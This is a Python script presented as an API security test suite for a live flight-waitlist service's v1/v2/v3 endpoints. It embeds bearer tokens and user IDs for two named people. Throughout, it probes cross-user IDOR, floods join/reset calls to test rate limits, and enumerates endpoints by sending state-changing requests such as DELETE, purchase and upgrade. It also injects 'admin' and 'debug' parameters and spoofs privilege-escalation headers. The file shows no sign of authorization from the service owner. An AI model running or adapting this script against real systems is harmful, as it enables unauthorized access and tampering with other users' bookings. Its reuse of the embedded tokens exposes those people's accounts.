#!/usr/bin/env python3
"""
Comprehensive V2/V3 API Security Testing Suite

Tests:
1. Priority Score Changes with v2 Operations
2. IDOR Vulnerabilities
3. Rate Limiting
4. Endpoint Enumeration
5. Parameter Injection
6. Header Escalation
7. Cross-Version Comparison
"""

import requests
import json
import time
import uuid
from datetime import datetime

# Configuration
API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
ASHLEY_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoxNzEyMDgsImlhdCI6MTc2MjIyNTUwMSwiZXhwIjoxNzY0ODE3NTAxfQ.TtZeO8zr_3aoLe21AmLGMsLj-ACxXqBh6cKNph_9dYg"

SAMEER_ID = 20254
ASHLEY_ID = 171208

# Test results storage
test_results = {
    "priority_score": {},
    "idor": {},
    "rate_limiting": {},
    "enumeration": {},
    "parameters": {},
    "headers": {},
    "cross_version": {}
}

def log_section(title):
    """Print formatted section header"""
    print("\n" + "="*80)
    print(f"  {title}")
    print("="*80 + "\n")

def log_test(name, status, details=""):
    """Log test result"""
    icon = "✅" if status == "PASS" else "❌" if status == "FAIL" else "⚠️" if status == "WARN" else "ℹ️"
    print(f"{icon} {name}: {status}")
    if details:
        print(f"   {details}")

def get_user_data(token, version="v1"):
    """Get user data from API"""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{API_URL}/{version}/user", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def get_current_flights(token, version="v2"):
    """Get user's current flights"""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{API_URL}/{version}/flight/current", headers=headers, timeout=10)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def join_flight(token, flight_id, version="v2", extra_headers=None):
    """Join a flight waitlist"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    if extra_headers:
        headers.update(extra_headers)

    try:
        r = requests.post(
            f"{API_URL}/{version}/flight/{flight_id}/enter",
            headers=headers,
            json={},
            timeout=10
        )
        return r
    except Exception as e:
        return None

def reset_flight(token, flight_id, version="v2", extra_headers=None):
    """Leave a flight waitlist (v2/reset)"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    if extra_headers:
        headers.update(extra_headers)

    try:
        r = requests.post(
            f"{API_URL}/{version}/flight/{flight_id}/reset",
            headers=headers,
            json={},
            timeout=10
        )
        return r
    except Exception as e:
        return None

def get_available_flights(token):
    """Get available flights from v3 API"""
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(
            f"{API_URL}/v3/flight?includeExpired=false&nearMe=false",
            headers=headers,
            timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

# ============================================================================
# TEST 1: PRIORITY SCORE CHANGES WITH V2 OPERATIONS
# ============================================================================

def test_priority_score_v2():
    """Test if priority score changes when using v2 APIs"""
    log_section("TEST 1: Priority Score Changes with V2 Operations")

    # Get baseline priority score
    log_test("Getting Sameer's baseline priority score", "INFO")
    baseline = get_user_data(SAMEER_TOKEN, "v1")
    if not baseline:
        log_test("Failed to get baseline data", "FAIL")
        return

    baseline_score = baseline.get('priorityScore')
    log_test(f"Baseline Priority Score: {baseline_score}", "INFO",
             f"Date: {datetime.fromtimestamp(baseline_score).strftime('%Y-%m-%d %H:%M:%S')}")

    # Get a flight to test with
    flights = get_available_flights(SAMEER_TOKEN)
    if not flights or len(flights) == 0:
        log_test("No available flights to test with", "WARN")
        test_results["priority_score"]["no_flights"] = True
        return

    test_flight = flights[0]
    flight_id = test_flight['id']
    log_test(f"Using test flight: {flight_id}", "INFO",
             f"{test_flight.get('origin', {}).get('code')} → {test_flight.get('destination', {}).get('code')}")

    # Check if already on flight
    current_flights = get_current_flights(SAMEER_TOKEN)
    on_flight = any(f['id'] == flight_id for f in (current_flights or []))

    if not on_flight:
        # Join flight
        log_test("Joining flight with v2/enter", "INFO")
        r = join_flight(SAMEER_TOKEN, flight_id, "v2")
        if r and r.status_code == 200:
            log_test("Successfully joined flight", "PASS")
        else:
            log_test("Failed to join flight", "FAIL", f"Status: {r.status_code if r else 'N/A'}")
            return

        # Check priority score after join
        after_join = get_user_data(SAMEER_TOKEN, "v1")
        after_join_score = after_join.get('priorityScore')

        if after_join_score == baseline_score:
            log_test("Priority score unchanged after join", "PASS",
                     f"Still: {after_join_score}")
        else:
            log_test("Priority score CHANGED after join", "WARN",
                     f"Before: {baseline_score}, After: {after_join_score}, Diff: {after_join_score - baseline_score}")

        test_results["priority_score"]["after_join"] = {
            "before": baseline_score,
            "after": after_join_score,
            "changed": after_join_score != baseline_score
        }
    else:
        log_test("Already on flight, will test reset only", "INFO")

    # Reset/leave flight
    log_test("Leaving flight with v2/reset", "INFO")
    r = reset_flight(SAMEER_TOKEN, flight_id, "v2")
    if r and r.status_code == 200:
        log_test("Successfully left flight", "PASS")
    else:
        log_test("Failed to leave flight", "FAIL", f"Status: {r.status_code if r else 'N/A'}")
        return

    # Check priority score after reset
    after_reset = get_user_data(SAMEER_TOKEN, "v1")
    after_reset_score = after_reset.get('priorityScore')

    if after_reset_score == baseline_score:
        log_test("Priority score unchanged after reset", "PASS",
                 f"Still: {after_reset_score}")
    else:
        log_test("Priority score CHANGED after reset", "WARN",
                 f"Before: {baseline_score}, After: {after_reset_score}, Diff: {after_reset_score - baseline_score}")

    test_results["priority_score"]["after_reset"] = {
        "before": baseline_score,
        "after": after_reset_score,
        "changed": after_reset_score != baseline_score
    }

    # Final comparison
    if baseline_score == after_reset_score:
        log_test("CONCLUSION: v2 operations do NOT affect priority score", "PASS")
    else:
        log_test("CONCLUSION: v2 operations MAY affect priority score", "WARN",
                 "Further investigation needed")

# ============================================================================
# TEST 2: IDOR VULNERABILITY TESTING
# ============================================================================

def test_idor_vulnerability():
    """Test if User A can affect User B's flights (IDOR)"""
    log_section("TEST 2: IDOR Vulnerability Testing")

    # Get available flights
    flights = get_available_flights(SAMEER_TOKEN)
    if not flights or len(flights) == 0:
        log_test("No available flights to test with", "WARN")
        return

    test_flight = flights[0]
    flight_id = test_flight['id']
    log_test(f"Using test flight: {flight_id}", "INFO")

    # Scenario 1: Sameer joins, Ashley tries to remove him
    log_test("Scenario 1: User B tries to remove User A", "INFO")

    # Sameer joins
    r = join_flight(SAMEER_TOKEN, flight_id, "v2")
    if not r or r.status_code != 200:
        log_test("Sameer couldn't join flight", "WARN", "Skipping IDOR test")
        return

    log_test("Sameer successfully joined flight", "PASS")

    # Verify Sameer is on flight
    sameer_flights = get_current_flights(SAMEER_TOKEN)
    sameer_on_flight = any(f['id'] == flight_id for f in (sameer_flights or []))

    if not sameer_on_flight:
        log_test("Verification failed: Sameer not showing on flight", "FAIL")
        return

    # Ashley tries to reset Sameer's flight
    log_test("Ashley attempting to remove Sameer with v2/reset", "INFO")
    r = reset_flight(ASHLEY_TOKEN, flight_id, "v2")

    if r and r.status_code == 200:
        log_test("Ashley's reset request succeeded", "INFO", f"Status: {r.status_code}")
    else:
        log_test("Ashley's reset request failed", "INFO",
                 f"Status: {r.status_code if r else 'N/A'}, Response: {r.text[:100] if r else 'N/A'}")

    # Check if Sameer is still on flight
    sameer_flights_after = get_current_flights(SAMEER_TOKEN)
    sameer_still_on = any(f['id'] == flight_id for f in (sameer_flights_after or []))

    if sameer_still_on:
        log_test("IDOR TEST PASSED: Sameer still on flight", "PASS",
                 "Ashley could not remove Sameer (SECURE)")
        test_results["idor"]["cross_user_reset"] = "SECURE"
    else:
        log_test("IDOR VULNERABILITY FOUND: Sameer was removed!", "FAIL",
                 "Ashley successfully removed Sameer (CRITICAL VULNERABILITY)")
        test_results["idor"]["cross_user_reset"] = "VULNERABLE"

    # Cleanup: Remove Sameer from flight
    if sameer_still_on:
        reset_flight(SAMEER_TOKEN, flight_id, "v2")

# ============================================================================
# TEST 3: RATE LIMITING
# ============================================================================

def test_rate_limiting():
    """Test rate limiting on v2 join/reset operations"""
    log_section("TEST 3: Rate Limiting Testing")

    # Get available flights
    flights = get_available_flights(SAMEER_TOKEN)
    if not flights or len(flights) == 0:
        log_test("No available flights to test with", "WARN")
        return

    test_flight = flights[0]
    flight_id = test_flight['id']
    log_test(f"Using test flight: {flight_id}", "INFO")

    # Test rapid join/reset cycles
    log_test("Testing rapid join/reset cycles (max 50 attempts)", "INFO")

    start_time = time.time()
    success_count = 0
    rate_limited = False
    rate_limit_at = 0

    for i in range(50):
        # Join
        r_join = join_flight(SAMEER_TOKEN, flight_id, "v2")
        if r_join and r_join.status_code == 429:
            rate_limited = True
            rate_limit_at = i
            log_test(f"Rate limited at attempt {i}", "INFO", "Status: 429 Too Many Requests")
            break

        if r_join and r_join.status_code == 200:
            success_count += 1

        # Reset
        r_reset = reset_flight(SAMEER_TOKEN, flight_id, "v2")
        if r_reset and r_reset.status_code == 429:
            rate_limited = True
            rate_limit_at = i
            log_test(f"Rate limited at attempt {i}", "INFO", "Status: 429 Too Many Requests")
            break

        # Small delay to avoid overwhelming
        time.sleep(0.1)

    elapsed = time.time() - start_time
    rate = success_count / elapsed if elapsed > 0 else 0

    log_test(f"Completed {success_count} join/reset cycles in {elapsed:.2f}s", "INFO",
             f"Rate: {rate:.2f} operations/second")

    if rate_limited:
        log_test("Rate limiting IS implemented", "PASS",
                 f"Limited after {rate_limit_at} requests")
        test_results["rate_limiting"]["implemented"] = True
        test_results["rate_limiting"]["limit_at"] = rate_limit_at
    else:
        log_test("Rate limiting NOT detected", "WARN",
                 f"Completed {success_count} cycles without limiting")
        test_results["rate_limiting"]["implemented"] = False

    test_results["rate_limiting"]["cycles_completed"] = success_count
    test_results["rate_limiting"]["duration"] = elapsed
    test_results["rate_limiting"]["rate"] = rate

# ============================================================================
# TEST 4: ENDPOINT ENUMERATION
# ============================================================================

def test_endpoint_enumeration():
    """Systematically test v2/v3 endpoints"""
    log_section("TEST 4: Endpoint Enumeration")

    # Get a test flight ID
    flights = get_available_flights(SAMEER_TOKEN)
    flight_id = flights[0]['id'] if flights and len(flights) > 0 else 8800

    log_test(f"Using flight ID {flight_id} for enumeration", "INFO")

    # V2 Flight endpoints to test
    v2_flight_ops = [
        "enter", "reset", "exit", "leave", "cancel",
        "confirm", "purchase", "claim", "accept", "reject",
        "upgrade", "downgrade", "modify", "update", "delete",
        "status", "details", "info"
    ]

    # V2 User endpoints
    v2_user_ops = [
        "profile", "settings", "upgrade", "subscription",
        "flights", "history", "waitlist", "priority"
    ]

    # V2 Subscription endpoints
    v2_subscription_ops = [
        "status", "upgrade", "cancel", "renew", "pk"
    ]

    discovered_endpoints = []
    headers = {"Authorization": f"Bearer {SAMEER_TOKEN}"}

    # Test v2 flight operations
    log_test("Testing v2 flight operations", "INFO")
    for op in v2_flight_ops:
        for method in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
            url = f"{API_URL}/v2/flight/{flight_id}/{op}"
            try:
                if method == "GET":
                    r = requests.get(url, headers=headers, timeout=5)
                elif method == "POST":
                    r = requests.post(url, headers=headers, json={}, timeout=5)
                elif method == "PUT":
                    r = requests.put(url, headers=headers, json={}, timeout=5)
                elif method == "PATCH":
                    r = requests.patch(url, headers=headers, json={}, timeout=5)
                elif method == "DELETE":
                    r = requests.delete(url, headers=headers, timeout=5)

                if r.status_code not in [404, 405]:
                    discovered_endpoints.append({
                        "endpoint": f"/v2/flight/{{id}}/{op}",
                        "method": method,
                        "status": r.status_code,
                        "response_preview": r.text[:100]
                    })
                    log_test(f"Found: {method} /v2/flight/{{id}}/{op}", "PASS",
                             f"Status: {r.status_code}")
            except:
                pass

    # Test v2 user endpoints
    log_test("Testing v2 user endpoints", "INFO")
    for op in v2_user_ops:
        url = f"{API_URL}/v2/user/{op}"
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code not in [404, 405]:
                discovered_endpoints.append({
                    "endpoint": f"/v2/user/{op}",
                    "method": "GET",
                    "status": r.status_code,
                    "response_preview": r.text[:100]
                })
                log_test(f"Found: GET /v2/user/{op}", "PASS",
                         f"Status: {r.status_code}")
        except:
            pass

    # Test v2 subscription endpoints
    log_test("Testing v2 subscription endpoints", "INFO")
    for op in v2_subscription_ops:
        url = f"{API_URL}/v2/subscription/{op}"
        try:
            r = requests.get(url, headers=headers, timeout=5)
            if r.status_code not in [404, 405]:
                discovered_endpoints.append({
                    "endpoint": f"/v2/subscription/{op}",
                    "method": "GET",
                    "status": r.status_code,
                    "response_preview": r.text[:100]
                })
                log_test(f"Found: GET /v2/subscription/{op}", "PASS",
                         f"Status: {r.status_code}")
        except:
            pass

    test_results["enumeration"]["discovered"] = discovered_endpoints
    log_test(f"Total new endpoints discovered: {len(discovered_endpoints)}", "INFO")

# ============================================================================
# TEST 5: V3 PARAMETER INJECTION
# ============================================================================

def test_v3_parameters():
    """Test v3 API parameter injection"""
    log_section("TEST 5: V3 Parameter Injection Testing")

    headers = {"Authorization": f"Bearer {SAMEER_TOKEN}"}

    # Get baseline
    log_test("Getting baseline flight count", "INFO")
    r_baseline = requests.get(
        f"{API_URL}/v3/flight?includeExpired=false&nearMe=false",
        headers=headers,
        timeout=10
    )

    if r_baseline.status_code != 200:
        log_test("Failed to get baseline", "FAIL")
        return

    baseline_flights = r_baseline.json()
    baseline_count = len(baseline_flights)
    log_test(f"Baseline flight count: {baseline_count}", "INFO")

    # Test parameters
    test_params = [
        ("includeExpired=true", "Include expired flights"),
        ("nearMe=true", "Near me filter"),
        ("showAll=true", "Show all flights"),
        ("admin=true", "Admin flag"),
        ("debug=true", "Debug mode"),
        ("limit=9999", "High limit"),
        ("includeDeleted=true", "Include deleted"),
        ("includePrivate=true", "Include private"),
        ("bypassFilters=true", "Bypass filters"),
        ("userId=123", "Specific user ID"),
    ]

    interesting_params = []

    for param, description in test_params:
        url = f"{API_URL}/v3/flight?includeExpired=false&nearMe=false&{param}"
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                flights = r.json()
                count = len(flights)

                if count != baseline_count:
                    log_test(f"Parameter {param} changed result", "WARN",
                             f"Baseline: {baseline_count}, With param: {count}")
                    interesting_params.append({
                        "param": param,
                        "description": description,
                        "baseline_count": baseline_count,
                        "new_count": count,
                        "difference": count - baseline_count
                    })
                else:
                    log_test(f"Parameter {param} had no effect", "INFO")
            else:
                log_test(f"Parameter {param} returned {r.status_code}", "INFO")
        except Exception as e:
            log_test(f"Parameter {param} caused error", "WARN", str(e))

    test_results["parameters"]["interesting"] = interesting_params

    if interesting_params:
        log_test(f"Found {len(interesting_params)} parameters that change results", "WARN",
                 "May indicate information disclosure")
    else:
        log_test("No parameter injection vectors found", "PASS")

# ============================================================================
# TEST 6: HEADER ESCALATION
# ============================================================================

def test_header_escalation():
    """Test special header values for privilege escalation"""
    log_section("TEST 6: Header Escalation Testing")

    # Get a test flight
    flights = get_available_flights(SAMEER_TOKEN)
    if not flights or len(flights) == 0:
        log_test("No available flights to test with", "WARN")
        return

    flight_id = flights[0]['id']

    # Test different header combinations
    test_headers = [
        ({"x-app-platform": "admin"}, "Admin platform"),
        ({"x-app-platform": "internal"}, "Internal platform"),
        ({"x-app-platform": "debug"}, "Debug platform"),
        ({"x-device-id": "00000000-0000-0000-0000-000000000000"}, "Zero device ID"),
        ({"x-device-id": "admin-device"}, "Admin device ID"),
        ({"x-build-number": "9999"}, "Future build number"),
        ({"x-build-number": "0"}, "Zero build number"),
        ({"x-internal-request": "true"}, "Internal request flag"),
        ({"x-admin": "true"}, "Admin flag"),
        ({"x-debug": "true"}, "Debug flag"),
    ]

    interesting_headers = []

    for headers, description in test_headers:
        log_test(f"Testing headers: {description}", "INFO")

        # Try to join with special headers
        r = join_flight(SAMEER_TOKEN, flight_id, "v2", headers)

        if r:
            if r.status_code == 200:
                # Check if response is different
                try:
                    data = r.json()
                    # Look for admin/debug fields
                    data_str = json.dumps(data)
                    if any(key in data_str.lower() for key in ['admin', 'debug', 'internal', 'privilege']):
                        log_test(f"Header {description} may reveal extra data", "WARN")
                        interesting_headers.append({
                            "headers": headers,
                            "description": description,
                            "finding": "Possible extra data in response"
                        })
                except:
                    pass

                # Cleanup
                reset_flight(SAMEER_TOKEN, flight_id, "v2")

            log_test(f"Status: {r.status_code}", "INFO")

    test_results["headers"]["interesting"] = interesting_headers

    if interesting_headers:
        log_test(f"Found {len(interesting_headers)} header combinations of interest", "WARN")
    else:
        log_test("No header escalation vectors found", "PASS")

# ============================================================================
# TEST 7: CROSS-VERSION COMPARISON
# ============================================================================

def test_cross_version_comparison():
    """Compare v1 vs v2 behavior"""
    log_section("TEST 7: Cross-Version Comparison (v1 vs v2)")

    # Get available flights
    flights = get_available_flights(SAMEER_TOKEN)
    if not flights or len(flights) == 0:
        log_test("No available flights to test with", "WARN")
        return

    flight_id = flights[0]['id']
    log_test(f"Using flight {flight_id} for comparison", "INFO")

    comparisons = {}

    # Test 1: Join with v1
    log_test("Testing join with v1/enter", "INFO")
    r_v1_join = join_flight(SAMEER_TOKEN, flight_id, "v1")
    v1_join_status = r_v1_join.status_code if r_v1_join else None
    v1_join_time = time.time()

    if v1_join_status == 200:
        log_test("v1 join successful", "PASS")
        # Leave with v1
        time.sleep(0.5)
        reset_flight(SAMEER_TOKEN, flight_id, "v1")
        time.sleep(0.5)

    # Test 2: Join with v2
    log_test("Testing join with v2/enter", "INFO")
    r_v2_join = join_flight(SAMEER_TOKEN, flight_id, "v2")
    v2_join_status = r_v2_join.status_code if r_v2_join else None
    v2_join_time = time.time()

    if v2_join_status == 200:
        log_test("v2 join successful", "PASS")
        time.sleep(0.5)
        reset_flight(SAMEER_TOKEN, flight_id, "v2")

    comparisons["join"] = {
        "v1_status": v1_join_status,
        "v2_status": v2_join_status,
        "both_work": v1_join_status == 200 and v2_join_status == 200
    }

    if v1_join_status == v2_join_status:
        log_test("v1 and v2 join have same behavior", "PASS")
    else:
        log_test("v1 and v2 join have different behavior", "WARN",
                 f"v1: {v1_join_status}, v2: {v2_join_status}")

    test_results["cross_version"] = comparisons

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Run all security tests"""
    print("\n" + "="*80)
    print("  VAUNT API V2/V3 COMPREHENSIVE SECURITY TEST SUITE")
    print("  Date: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    print("="*80)

    try:
        # Run all tests
        test_priority_score_v2()
        test_idor_vulnerability()
        test_rate_limiting()
        test_endpoint_enumeration()
        test_v3_parameters()
        test_header_escalation()
        test_cross_version_comparison()

        # Save results
        log_section("SAVING RESULTS")
        output_file = "/home/user/vaunt/api_testing/v2_v3_test_results.json"
        with open(output_file, 'w') as f:
            json.dump(test_results, f, indent=2)
        log_test(f"Results saved to {output_file}", "PASS")

        # Summary
        log_section("TEST SUMMARY")
        print(json.dumps(test_results, indent=2))

    except KeyboardInterrupt:
        log_test("Testing interrupted by user", "WARN")
    except Exception as e:
        log_test(f"Testing failed with error: {str(e)}", "FAIL")

if __name__ == "__main__":
    main()
